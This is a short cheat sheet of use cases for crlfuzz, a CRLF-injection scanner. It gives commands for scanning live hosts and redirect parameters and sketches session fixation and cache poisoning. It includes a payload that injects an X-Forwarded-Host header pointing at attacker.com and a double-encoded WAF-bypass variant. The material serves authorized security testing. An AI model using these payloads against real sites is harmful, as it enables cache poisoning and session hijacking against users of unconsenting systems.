# crlfuzz — Use Cases

## Scenario 1: All Live Hosts
```bash
cat httpx_live.txt | crlfuzz -s > crlf_results.txt
```
Fast scan, low noise. Host-level test, not parameter-specific.

## Scenario 2: Redirect Endpoints
Focus on endpoints that perform redirects — Location header injection is highest impact.
```bash
grep -E "\?(redirect|return|next|url|location)=" all_urls.txt | crlfuzz -s
```

## Scenario 3: Login and Auth Flows
Cookie injection in login flows = session fixation. High severity if session cookies are set via redirect.

## Scenario 4: Cache Poisoning Chain
CRLF + cache header injection = web cache poisoning.
```bash
crlfuzz -u "https://target.com/?x=1%0d%0aX-Forwarded-Host: attacker.com"
```
If cached, can serve attacker content to all users.

## Scenario 5: WAF-Protected Target
```bash
crlfuzz -u "https://target.com/?x=1%250d%250aInjected: header"
```
Double-encode for WAF bypass. Also try Unicode CR/LF variants.
